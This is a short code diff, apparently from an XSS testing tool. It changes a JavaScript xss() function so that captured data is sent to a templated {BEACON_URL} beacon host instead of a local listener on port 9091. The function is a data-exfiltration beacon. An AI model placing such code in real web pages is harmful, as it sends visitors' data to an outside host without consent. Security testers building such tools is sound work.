@@ -3,9 +3,9 @@ xss_array = []
 
 function xss(data) {
   try {
-    // Send payload to local listener via a simple GET request (port 9091)
+    // Send payload to beacon listener via a simple GET request
     var xhr = new XMLHttpRequest();
-    var url = "http://127.0.0.1:9091/?data=" + encodeURIComponent(data);
+    var url = "{BEACON_URL}?data=" + encodeURIComponent(data);
     xhr.open("GET", url, true);
     xhr.send();
   } catch (e) {
